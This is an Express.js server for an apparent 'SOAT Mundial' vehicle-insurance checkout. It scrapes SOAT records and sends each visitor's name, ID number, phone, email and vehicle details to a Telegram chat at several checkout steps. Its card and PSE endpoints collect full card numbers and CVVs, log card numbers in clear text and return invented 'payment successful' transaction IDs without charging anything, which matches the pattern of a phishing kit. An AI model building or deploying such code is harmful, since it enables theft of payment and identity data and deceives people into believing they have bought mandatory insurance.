// Cargar variables de entorno
require("dotenv").config();

const express = require("express");
const path = require("path");
const cors = require("cors");
const consultarSOAT = require("./soatScraper");
const payzenClient = require("./payzen");

const app = express();

// Validaciones de configuración
(function validateConfig() {
  const isProduction = process.env.NODE_ENV === "production";
  const missing = [];

  // PayZen
  if (!process.env.PAYZEN_SHOP_ID) missing.push("PAYZEN_SHOP_ID");
  if (!process.env.PAYZEN_CERTIFICATE) missing.push("PAYZEN_CERTIFICATE");
  if (!process.env.PAYZEN_ENVIRONMENT) missing.push("PAYZEN_ENVIRONMENT");

  // Telegram (ya se permite modo sin Telegram, solo advertencia)
  const telegramMissing = [];
  if (!process.env.TELEGRAM_BOT_TOKEN) telegramMissing.push("TELEGRAM_BOT_TOKEN");
  if (!process.env.TELEGRAM_CHAT_ID) telegramMissing.push("TELEGRAM_CHAT_ID");

  if (isProduction && missing.length > 0) {
    console.error(
      "❌ Variables obligatorias de PayZen faltantes en producción:",
      missing.join(", ")
    );
    process.exit(1);
  } else if (missing.length > 0) {
    console.warn(
      "⚠️  Variables de PayZen faltantes (modo simulado activado):",
      missing.join(", ")
    );
  }

  if (telegramMissing.length > 0) {
    console.warn(
      "⚠️  Telegram no está completamente configurado:",
      telegramMissing.join(", ")
    );
  }
})();

// Helper para validar monto en backend
function recalculateTotalFromResumen(resumenData = {}, segurosEliminados = {}) {
  let total = 0;
  if (resumenData.soat) {
    total += parseInt(String(resumenData.soat).replace(/[^\d]/g, "")) || 0;
  }
  if (!segurosEliminados.tercero && resumenData.tercero) {
    total += parseInt(String(resumenData.tercero).replace(/[^\d]/g, "")) || 0;
  }
  if (!segurosEliminados.accidente && resumenData.accidente) {
    total += parseInt(String(resumenData.accidente).replace(/[^\d]/g, "")) || 0;
  }
  return total;
}

// Configurar CORS
app.use(
  cors({
    origin: "*",
    methods: ["GET", "POST", "PUT", "DELETE", "OPTIONS"],
    allowedHeaders: ["Content-Type", "Authorization"],
  })
);

app.use(express.json());

// Variable para almacenar el progreso actual
let currentProgress = {
  percentage: 0,
  status: "",
  isComplete: false,
};

// Función para actualizar progreso
function updateServerProgress(percentage, status) {
  currentProgress = {
    percentage,
    status,
    isComplete: percentage >= 100,
  };
}

// Hacer la función disponible globalmente para el scraper
global.updateServerProgress = updateServerProgress;

// Endpoint para consultar progreso
app.get("/api/progress", (req, res) => {
  res.json(currentProgress);
});

// Endpoint de salud para verificar que el servidor esté funcionando
app.get("/api/health", (req, res) => {
  res.json({
    status: "OK",
    message: "Servidor SOAT Mundial funcionando correctamente",
    timestamp: new Date().toISOString(),
  });
});

// Endpoint de test para verificar que las rutas API funcionan
app.get("/api/test", (req, res) => {
  res.json({
    message: "API funcionando correctamente",
    timestamp: new Date().toISOString(),
  });
});

app.use(express.static(path.join(__dirname)));

// Endpoint para consultar SOAT
app.post("/api/soat", async (req, res) => {
  const { placa, tipoDocumento, numeroDocumento } = req.body;

  // Validar parámetros requeridos
  if (!placa) {
    return res.status(400).json({ error: "Placa requerida" });
  }
  if (!tipoDocumento) {
    return res.status(400).json({ error: "Tipo de documento requerido" });
  }
  if (!numeroDocumento) {
    return res.status(400).json({ error: "Número de documento requerido" });
  }

  // Resetear progreso
  currentProgress = {
    percentage: 0,
    status: "Iniciando...",
    isComplete: false,
  };

  try {
    const data = await consultarSOAT(placa, tipoDocumento, numeroDocumento);
    const parsedData = JSON.parse(data);

    // Verificar si hay error en la respuesta del scraper
    if (parsedData.error) {
      res.status(500).json({
        error: true,
        message: parsedData.message,
      });
      return;
    }

    // Enviar respuesta JSON exitosa
    res.setHeader("Content-Type", "application/json; charset=utf-8");
    res.json(parsedData);
  } catch (error) {
    res.status(500).json({
      error: true,
      message: "Error al consultar el SOAT",
      details: error.message,
    });
  }
});

// Endpoint para enviar notificación de pago exitoso a Telegram
app.post("/api/telegram-pago", async (req, res) => {
  try {
    const {
      vehiculoData,
      propietarioData,
      resumenData,
      contactoData,
      opcionesSeleccionadas,
      tipoNotificacion,
    } = req.body;

    // Verificar que tenemos los datos necesarios
    if (!propietarioData || !resumenData) {
      return res.status(400).json({
        error: true,
        message: "Datos incompletos para la notificación de pago",
      });
    }

    // Obtener variables de entorno
    const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
    const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
      console.log("Configuración de Telegram no disponible");
      return res.status(200).json({
        success: true,
        message: "Notificación de pago procesada (Telegram no configurado)",
      });
    }

    // Formatear mensaje de pago exitoso
    const horaActual = new Date().toLocaleString("es-CO", {
      timeZone: "America/Bogota",
      year: "numeric",
      month: "2-digit",
      day: "2-digit",
      hour: "2-digit",
      minute: "2-digit",
      second: "2-digit",
    });

    const nombreCompleto = `${propietarioData.nombres || ""} ${
      propietarioData.apellidos || ""
    }`.trim();
    const documento = propietarioData.documento || "No especificado";
    const total = resumenData.total || "$0";

    const mensajePago =
      `💳 <b>PAGO EXITOSO - SOAT MUNDIAL</b> 💳\n\n` +
      `✅ <b>${nombreCompleto}</b> CC: <b>${documento}</b>\n` +
      `⏰ <b>${horaActual}</b>\n\n` +
      `🚗 <b>Vehículo:</b>\n` +
      `   • Placa: ${vehiculoData.placa || "No especificada"}\n` +
      `   • Marca: ${vehiculoData.marca || "No especificada"}\n` +
      `   • Modelo: ${vehiculoData.modelo || "No especificado"}\n` +
      `   • Tipo: ${
        vehiculoData.tipo || vehiculoData.clase || "No especificado"
      }\n\n` +
      `💰 <b>Resumen de Pago:</b>\n` +
      `   • SOAT: ${resumenData.soat || "$0"}\n` +
      `   • Seguro Terceros: ${resumenData.tercero || "$0"}\n` +
      `   • Accidentes Personales: ${resumenData.accidente || "$0"}\n` +
      `   • <b>Total Pagado: ${total}</b>\n\n` +
      `📞 <b>Contacto:</b>\n` +
      `   • Teléfono: ${contactoData.telefono || "No especificado"}\n` +
      `   • Email: ${contactoData.email || "No especificado"}\n\n` +
      `🎯 <b>Opciones Seleccionadas:</b>\n` +
      `   • Terceros: ${
        opcionesSeleccionadas.terceros || "No seleccionado"
      }\n` +
      `   • Accidentes: ${
        opcionesSeleccionadas.accidentes || "No seleccionado"
      }\n\n` +
      `🎉 <i>¡Pago procesado exitosamente!</i>`;

    // Enviar mensaje a Telegram
    const axios = require("axios");
    const telegramResponse = await axios.post(
      `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
      {
        chat_id: TELEGRAM_CHAT_ID,
        text: mensajePago,
        parse_mode: "HTML",
      }
    );

    if (telegramResponse.data.ok) {
      console.log("✅ Notificación de pago enviada a Telegram exitosamente");
      res.json({
        success: true,
        message: "Notificación de pago enviada correctamente",
        messageId: telegramResponse.data.result.message_id,
      });
    } else {
      console.error("❌ Error al enviar notificación de pago a Telegram");
      res.status(500).json({
        error: true,
        message: "Error al enviar notificación de pago a Telegram",
      });
    }
  } catch (error) {
    console.error("Error en endpoint telegram-pago:", error);
    res.status(500).json({
      error: true,
      message: "Error interno del servidor",
      details: error.message,
    });
  }
});

// Endpoint para enviar notificación de paso a pagos
app.post("/api/telegram-paso-pagos", async (req, res) => {
  try {
    const { vehiculoData, propietarioData, contactoData, tipoNotificacion } =
      req.body;

    // Verificar que tenemos los datos necesarios
    if (!propietarioData || !contactoData) {
      return res.status(400).json({
        error: true,
        message: "Datos incompletos para la notificación de paso a pagos",
      });
    }

    // Obtener variables de entorno
    const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
    const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
      console.log("Configuración de Telegram no disponible");
      return res.status(200).json({
        success: true,
        message:
          "Notificación de paso a pagos procesada (Telegram no configurado)",
      });
    }

    // Formatear mensaje de paso a pagos
    const horaActual = new Date().toLocaleString("es-CO", {
      timeZone: "America/Bogota",
      year: "numeric",
      month: "2-digit",
      day: "2-digit",
      hour: "2-digit",
      minute: "2-digit",
      second: "2-digit",
    });

    const nombreCompleto = `${propietarioData.nombres || ""} ${
      propietarioData.apellidos || ""
    }`.trim();
    const documento = propietarioData.documento || "No especificado";
    const telefono = contactoData.telefono || "No especificado";
    const email = contactoData.email || "No especificado";
    const placa = vehiculoData.placa || "No especificada";

    const mensajePasoPagos =
      `📱 <b>PASO A PAGOS - SOAT MUNDIAL</b> 📱\n\n` +
      `👤 <b>${nombreCompleto}</b> CC: <b>${documento}</b>\n` +
      `🚗 <b>Placa:</b> ${placa}\n` +
      `📞 <b>Teléfono:</b> ${telefono}\n` +
      `📧 <b>Correo:</b> ${email}\n` +
      `⏰ <b>${horaActual}</b>\n\n` +
      `🔄 <i>Usuario ha pasado a la vista de pagos</i>`;

    // Enviar mensaje a Telegram
    const axios = require("axios");
    const telegramResponse = await axios.post(
      `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
      {
        chat_id: TELEGRAM_CHAT_ID,
        text: mensajePasoPagos,
        parse_mode: "HTML",
      }
    );

    if (telegramResponse.data.ok) {
      console.log(
        "✅ Notificación de paso a pagos enviada a Telegram exitosamente"
      );
      res.json({
        success: true,
        message: "Notificación de paso a pagos enviada correctamente",
        messageId: telegramResponse.data.result.message_id,
      });
    } else {
      console.error(
        "❌ Error al enviar notificación de paso a pagos a Telegram"
      );
      res.status(500).json({
        error: true,
        message: "Error al enviar notificación de paso a pagos a Telegram",
      });
    }
  } catch (error) {
    console.error("Error en endpoint telegram-paso-pagos:", error);
    res.status(500).json({
      error: true,
      message: "Error interno del servidor",
      details: error.message,
    });
  }
});

// Endpoint para procesar pagos con tarjeta
app.post("/api/payment/card", async (req, res) => {
  try {
    const {
      cardNumber,
      expiryDate,
      cvv,
      cardholderName,
      email,
      phone,
      amount,
      vehiculoData,
      propietarioData,
      resumenData,
      segurosEliminados = {},
      displayTotal,
    } = req.body;

    // Validar datos requeridos
    if (
      !cardNumber ||
      !expiryDate ||
      !cvv ||
      !cardholderName ||
      !email ||
      !phone ||
      !amount
    ) {
      return res.status(400).json({
        error: true,
        message: "Datos de tarjeta incompletos",
      });
    }

    // Validar monto contra lo recalculado desde el resumen
    const expected = recalculateTotalFromResumen(resumenData, segurosEliminados);
    if (Number(amount) !== Number(expected) || Number(displayTotal || expected) !== Number(expected)) {
      return res.status(400).json({
        error: true,
        message: "Monto inválido: no coincide con el total mostrado",
        expected,
        received: amount,
      });
    }

    // Simulación de procesamiento
    console.log("Procesando pago con tarjeta:", {
      cardNumber: String(cardNumber).replace(/(.{4})/g, "$1 ").trim(),
      expiryDate,
      cardholderName,
      email,
      amount,
    });

    await new Promise((resolve) => setTimeout(resolve, 2000));

    const transactionId = "TXN_" + Date.now();

    res.json({
      success: true,
      transactionId: transactionId,
      message: "Pago procesado exitosamente",
      method: "credit-card",
      amount: amount,
      timestamp: new Date().toISOString(),
    });
  } catch (error) {
    console.error("Error en procesamiento de pago con tarjeta:", error);
    res.status(500).json({
      error: true,
      message: "Error interno del servidor",
      details: error.message,
    });
  }
});

// Endpoint para procesar pagos PSE
app.post("/api/payment/pse", async (req, res) => {
  try {
    const {
      bank,
      accountType,
      email,
      phone,
      amount,
      vehiculoData,
      propietarioData,
      resumenData,
      segurosEliminados = {},
      displayTotal,
    } = req.body;

    // Validar datos requeridos
    if (!bank || !accountType || !email || !phone || !amount) {
      return res.status(400).json({
        error: true,
        message: "Datos PSE incompletos",
      });
    }

    // Validar monto contra lo recalculado desde el resumen
    const expected = recalculateTotalFromResumen(resumenData, segurosEliminados);
    if (Number(amount) !== Number(expected) || Number(displayTotal || expected) !== Number(expected)) {
      return res.status(400).json({
        error: true,
        message: "Monto inválido: no coincide con el total mostrado",
        expected,
        received: amount,
      });
    }

    console.log("Procesando pago PSE:", {
      bank,
      accountType,
      email,
      amount,
    });

    await new Promise((resolve) => setTimeout(resolve, 2000));

    const transactionId = "PSE_" + Date.now();

    res.json({
      success: true,
      transactionId: transactionId,
      message: "Pago PSE procesado exitosamente",
      method: "pse",
      amount: amount,
      timestamp: new Date().toISOString(),
    });
  } catch (error) {
    console.error("Error en procesamiento de pago PSE:", error);
    res.status(500).json({
      error: true,
      message: "Error interno del servidor",
      details: error.message,
    });
  }
});

// Nuevo endpoint: Procesar pago con PayZen
app.post("/api/payment/payzen", async (req, res) => {
  try {
    const {
      amount,
      currency = "COP",
      cardNumber,
      expiryDate,
      cvv,
      cardholderName,
      email,
      phone,
      metadata,
      resumenData,
      segurosEliminados = {},
      displayTotal,
    } = req.body;

    if (!amount || !cardNumber || !expiryDate || !cvv || !cardholderName) {
      return res.status(400).json({
        error: true,
        message: "Datos de tarjeta incompletos para PayZen",
      });
    }

    // Validar monto contra lo recalculado desde el resumen
    const expected = recalculateTotalFromResumen(resumenData, segurosEliminados);
    if (Number(amount) !== Number(expected) || Number(displayTotal || expected) !== Number(expected)) {
      return res.status(400).json({
        error: true,
        message: "Monto inválido: no coincide con el total mostrado",
        expected,
        received: amount,
      });
    }

    const result = await payzenClient.createPayment({
      amount,
      currency,
      cardNumber,
      expiryDate,
      cvv,
      cardholderName,
      email,
      phone,
      metadata,
    });

    res.json({
      success: true,
      gateway: "payzen",
      ...result,
    });
  } catch (error) {
    console.error("Error en procesamiento de pago PayZen:", error);
    res.status(500).json({
      error: true,
      message: "Error en PayZen",
      details: error.message,
    });
  }
});

// Endpoint para enviar datos a Telegram (datos principales)
app.post("/api/telegram", async (req, res) => {
  try {
    const {
      vehiculoData,
      propietarioData,
      resumenData,
      contactoData,
      opcionesSeleccionadas,
    } = req.body;

    // Verificar que tenemos los datos necesarios
    if (!propietarioData || !resumenData) {
      return res.status(400).json({
        error: true,
        message: "Datos incompletos para la notificación",
      });
    }

    // Obtener variables de entorno
    const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
    const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
      console.log("Configuración de Telegram no disponible");
      return res.status(200).json({
        success: true,
        message: "Datos procesados (Telegram no configurado)",
      });
    }

    // Formatear mensaje principal
    const horaActual = new Date().toLocaleString("es-CO", {
      timeZone: "America/Bogota",
      year: "numeric",
      month: "2-digit",
      day: "2-digit",
      hour: "2-digit",
      minute: "2-digit",
      second: "2-digit",
    });

    const nombreCompleto = `${propietarioData.nombres || ""} ${
      propietarioData.apellidos || ""
    }`.trim();
    const documento = propietarioData.documento || "No especificado";
    const telefono = contactoData.telefono || "No especificado";
    const email = contactoData.email || "No especificado";
    const total = resumenData.total || "$0";

    const mensajePrincipal =
      `📋 <b>SOLICITUD SOAT MUNDIAL</b> 📋\n\n` +
      `👤 <b>Datos del Propietario:</b>\n` +
      `   • Nombre: ${nombreCompleto}\n` +
      `   • Documento: ${documento}\n` +
      `   • Teléfono: ${telefono}\n` +
      `   • Email: ${email}\n\n` +
      `🚗 <b>Datos del Vehículo:</b>\n` +
      `   • Placa: ${vehiculoData.placa || "No especificada"}\n` +
      `   • Marca: ${vehiculoData.marca || "No especificada"}\n` +
      `   • Modelo: ${vehiculoData.modelo || "No especificado"}\n` +
      `   • Tipo: ${
        vehiculoData.tipo || vehiculoData.clase || "No especificado"
      }\n\n` +
      `💰 <b>Resumen de Cotización:</b>\n` +
      `   • SOAT: ${resumenData.soat || "$0"}\n` +
      `   • Seguro Terceros: ${resumenData.tercero || "$0"}\n` +
      `   • Accidentes Personales: ${resumenData.accidente || "$0"}\n` +
      `   • <b>Total: ${total}</b>\n\n` +
      `🎯 <b>Opciones Seleccionadas:</b>\n` +
      `   • Terceros: ${
        opcionesSeleccionadas.terceros || "No seleccionado"
      }\n` +
      `   • Accidentes: ${
        opcionesSeleccionadas.accidentes || "No seleccionado"
      }\n\n` +
      `⏰ <b>${horaActual}</b>\n\n` +
      `📝 <i>Datos confirmados y enviados a la vista de pagos</i>`;

    // Enviar mensaje a Telegram
    const axios = require("axios");
    const telegramResponse = await axios.post(
      `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
      {
        chat_id: TELEGRAM_CHAT_ID,
        text: mensajePrincipal,
        parse_mode: "HTML",
      }
    );

    if (telegramResponse.data.ok) {
      console.log("✅ Datos principales enviados a Telegram exitosamente");
      res.json({
        success: true,
        message: "Datos enviados correctamente",
        messageId: telegramResponse.data.result.message_id,
      });
    } else {
      console.error("❌ Error al enviar datos principales a Telegram");
      res.status(500).json({
        error: true,
        message: "Error al enviar datos a Telegram",
      });
    }
  } catch (error) {
    console.error("Error en endpoint telegram:", error);
    res.status(500).json({
      error: true,
      message: "Error interno del servidor",
      details: error.message,
    });
  }
});

// Ruta raíz - servir index.html
app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "index.html"));
});

// Ruta para datos.html
app.get("/datos.html", (req, res) => {
  res.sendFile(path.join(__dirname, "datos.html"));
});

// Ruta para pago.html
app.get("/pago.html", (req, res) => {
  res.sendFile(path.join(__dirname, "pago.html"));
});

const PORT = process.env.PORT || 3000;

// Iniciar servidor solo en entornos no serverless
if (!process.env.VERCEL) {
  app.listen(PORT, () => {
    console.log(`🚀 Servidor SOAT Mundial corriendo en http://localhost:${PORT}`);
    console.log(`📊 Endpoints disponibles:`);
    console.log(`   POST /api/soat - Consultar datos de SOAT`);
    console.log(`   GET  /api/progress - Consultar progreso actual`);
    console.log(`   POST /api/payment/card - Procesar pago con tarjeta`);
    console.log(`   POST /api/payment/pse - Procesar pago PSE`);
    console.log(`   POST /api/telegram - Enviar datos principales a Telegram`);
    console.log(`   POST /api/telegram-pago - Notificación de pago exitoso`);
    console.log(
      `   POST /api/telegram-paso-pagos - Notificación de paso a pagos`
    );
    console.log(`   GET  /api/health - Estado del servidor`);

    // Verificar configuración de Telegram
    const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
    const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

    if (TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID) {
      console.log(`✅ Configuración de Telegram cargada correctamente`);
      console.log(`   Bot Token: ${TELEGRAM_BOT_TOKEN.substring(0, 10)}...`);
      console.log(`   Chat ID: ${TELEGRAM_CHAT_ID}`);
    } else {
      console.log(`⚠️  Configuración de Telegram no disponible`);
      console.log(
        `   Crea un archivo .env con TELEGRAM_BOT_TOKEN y TELEGRAM_CHAT_ID`
      );
    }
  });
}

module.exports = app;
